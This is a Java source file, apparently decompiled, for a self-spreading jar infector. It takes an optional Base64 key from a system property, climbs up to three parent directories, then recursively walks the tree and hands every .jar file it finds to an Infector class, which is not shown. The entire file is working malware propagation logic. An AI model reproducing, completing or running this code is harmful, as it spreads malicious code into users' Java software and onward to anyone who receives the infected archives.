import java.io.File;
import java.util.Base64;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class Main {
    public static String key = System.getProperty("gnu");
    public static File directory;
    public static ExecutorService executorService;

    public static void main(String[] args) {
        File file;
        byte[] byArray = new byte[]{-48, -6, -23, -57, 103, -92, 41, 103};
        if (key != null) {
            try {
                byArray = Base64.getDecoder().decode(key);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        directory = file = new File(".").getAbsoluteFile().getParentFile();
        Main.search(file, new AtomicInteger(0), byArray);
    }

    public static void search(File file, AtomicInteger atomicInteger, byte[] byArray) {
        File file2 = file;
        for (int i = 0; i < 3; ++i) {
            try {
                if (file2.getParentFile().getName().equals("/")) break;
                file2 = file2.getParentFile();
                continue;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        Main.infect(file2, atomicInteger, byArray);
    }

    public static void infect(File file, AtomicInteger atomicInteger, byte[] byArray) {
        File[] fileArray;
        if (atomicInteger.getAndIncrement() < 6 && (fileArray = file.listFiles()) != null) {
            for (File file2 : fileArray) {
                if (file2.isDirectory()) {
                    Main.infect(file2, new AtomicInteger(atomicInteger.get()), byArray);
                    continue;
                }
                if (!file2.getName().endsWith(".jar")) continue;
                new Infector().infect(file2, byArray);
            }
        }
    }

    static {
        executorService = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());
    }
}